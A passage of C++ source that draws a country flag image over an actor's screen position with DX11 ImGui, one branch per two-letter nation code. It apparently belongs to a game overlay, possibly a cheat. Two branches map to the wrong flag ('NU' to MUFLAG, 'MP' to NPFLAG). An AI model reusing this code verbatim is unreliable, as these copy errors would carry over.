		DX11::ImGui_DX11::DrawImage(DX11::CAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "KY")
	{
		DX11::ImGui_DX11::DrawImage(DX11::KYFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CF")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CFFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TD")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TDFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CL")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CLFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CN")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CNFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CX")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CXFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CC")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CCFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::COFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "KM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::KMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CD")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CDFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CK")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CKFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "HR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::HRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CU")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CUFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CW")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CWFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CY")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CYFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CZ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CZFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CI")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CIFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "DK")
	{
		DX11::ImGui_DX11::DrawImage(DX11::DKFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "DJ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::DJFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "DM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::DMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "DO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::DOFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "EC")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ECFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "EG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::EGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SV")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SVFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GQ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GQFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "ER")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ERFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "EE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::EEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SZ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SZFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "ET")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ETFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "FK")
	{
		DX11::ImGui_DX11::DrawImage(DX11::FKFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "FO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::FOFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "FJ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::FJFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "FI")
	{
		DX11::ImGui_DX11::DrawImage(DX11::FIFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "FR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::FRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GF")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GFFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PF")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PFFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TF")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TFFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GA")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "DE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::DEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GH")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GHFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GI")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GIFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GL")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GLFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GD")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GDFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GP")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GPFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GU")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GUFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GT")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GTFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GN")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GNFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GW")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GWFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GY")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GYFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "HT")
	{
		DX11::ImGui_DX11::DrawImage(DX11::HTFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "HM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::HMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "VA")
	{
		DX11::ImGui_DX11::DrawImage(DX11::VAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "HN")
	{
		DX11::ImGui_DX11::DrawImage(DX11::HNFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "HK")
	{
		DX11::ImGui_DX11::DrawImage(DX11::HKFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "HU")
	{
		DX11::ImGui_DX11::DrawImage(DX11::HUFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "JP")
	{
		DX11::ImGui_DX11::DrawImage(DX11::JPFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "JE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::JEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "JO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::JOFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "KZ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::KZFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "KE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::KEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "KI")
	{
		DX11::ImGui_DX11::DrawImage(DX11::KIFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "KP")
	{
		DX11::ImGui_DX11::DrawImage(DX11::KPFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "KR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::KRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "KW")
	{
		DX11::ImGui_DX11::DrawImage(DX11::KWFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "KG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::KGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "LA")
	{
		DX11::ImGui_DX11::DrawImage(DX11::LAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "LV")
	{
		DX11::ImGui_DX11::DrawImage(DX11::LVFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "LB")
	{
		DX11::ImGui_DX11::DrawImage(DX11::LBFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "LS")
	{
		DX11::ImGui_DX11::DrawImage(DX11::LSFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "LR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::LRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "LY")
	{
		DX11::ImGui_DX11::DrawImage(DX11::LYFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "LI")
	{
		DX11::ImGui_DX11::DrawImage(DX11::LIFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "LT")
	{
		DX11::ImGui_DX11::DrawImage(DX11::LTFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "LU")
	{
		DX11::ImGui_DX11::DrawImage(DX11::LUFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MOFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MW")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MWFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MY")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MYFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MV")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MVFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "ML")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MLFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MT")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MTFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MH")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MHFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MQ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MQFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MU")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MUFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "YT")
	{
		DX11::ImGui_DX11::DrawImage(DX11::YTFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MX")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MXFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "FM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::FMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MD")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MDFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MC")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MCFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MN")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MNFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "ME")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MS")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MSFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MA")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MZ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MZFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NA")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NP")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NPFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NL")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NLFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NC")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NCFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NZ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NZFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NI")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NIFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NU")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MUFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NF")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NFFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MP")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NPFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "NO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::NOFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "OM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::OMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PK")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PKFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PW")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PWFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PS")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PSFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PA")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PY")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PYFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PH")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PHFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PN")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PNFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PL")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PLFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PT")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PTFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "QA")
	{
		DX11::ImGui_DX11::DrawImage(DX11::QAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MK")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MKFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "RO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ROFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "RU")
	{
		DX11::ImGui_DX11::DrawImage(DX11::RUFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "RW")
	{
		DX11::ImGui_DX11::DrawImage(DX11::RWFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "RE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::REFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "BL")
	{
		DX11::ImGui_DX11::DrawImage(DX11::BLFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SH")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SHFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "KN")
	{
		DX11::ImGui_DX11::DrawImage(DX11::KNFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "LC")
	{
		DX11::ImGui_DX11::DrawImage(DX11::LCFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "MF")
	{
		DX11::ImGui_DX11::DrawImage(DX11::MFFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "PM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::PMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "VC")
	{
		DX11::ImGui_DX11::DrawImage(DX11::VCFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "WS")
	{
		DX11::ImGui_DX11::DrawImage(DX11::WSFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "ST")
	{
		DX11::ImGui_DX11::DrawImage(DX11::STFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SA")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SN")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SNFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "RS")
	{
		DX11::ImGui_DX11::DrawImage(DX11::RSFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SC")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SCFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SL")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SLFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SX")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SXFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SK")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SKFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SI")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SIFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SB")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SBFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SOFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "ZA")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ZAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GS")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GSFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SS")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SSFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "ES")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ESFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "LK")
	{
		DX11::ImGui_DX11::DrawImage(DX11::LKFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SD")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SDFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SJ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SJFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "CH")
	{
		DX11::ImGui_DX11::DrawImage(DX11::CHFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "SY")
	{
		DX11::ImGui_DX11::DrawImage(DX11::SYFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TW")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TWFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TJ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TJFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TZ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TZFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TH")
	{
		DX11::ImGui_DX11::DrawImage(DX11::THFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TL")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TLFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TK")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TKFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TO")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TOFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TT")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TTFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TN")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TNFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TC")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TCFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "TV")
	{
		DX11::ImGui_DX11::DrawImage(DX11::TVFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "UG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::UGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "UA")
	{
		DX11::ImGui_DX11::DrawImage(DX11::UAFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::AEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "GB")
	{
		DX11::ImGui_DX11::DrawImage(DX11::GBFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "US")
	{
		DX11::ImGui_DX11::DrawImage(DX11::USFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "UY")
	{
		DX11::ImGui_DX11::DrawImage(DX11::UYFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "UZ")
	{
